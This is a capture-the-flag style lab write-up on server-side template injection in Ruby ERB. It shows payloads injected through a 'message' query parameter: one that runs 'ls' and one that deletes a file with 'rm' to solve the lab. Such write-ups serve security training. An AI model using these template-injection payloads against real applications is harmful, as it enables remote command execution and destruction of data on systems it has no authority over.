# Lab: Basic server-side template injection

This lab is vulnerable to server-side template injection due to the unsafe
construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute
arbitrary code, then delete the morale.txt file from Carlos's home directory.


https://docs.ruby-lang.org/en/2.3.0/ERB.html
```Ruby
<%= Ruby expression -- replace with result %>
```

### Execute system commands via Ruby
https://www.rubyguides.com/2018/12/ruby-system/
```Ruby
system("ls")
```
```Ruby
<%= system("ls") %>
```

```HTTP
Request:
GET /?message=<%= system("ls") %>
```
```
Response:
morale.txt true
```
### The exploit:
```Ruby
<%= system("rm morale.txt") %>
```

## Request
```HTTP
GET /?message=<%= system("rm morale.txt") %>
```

## Response:
Lab solved


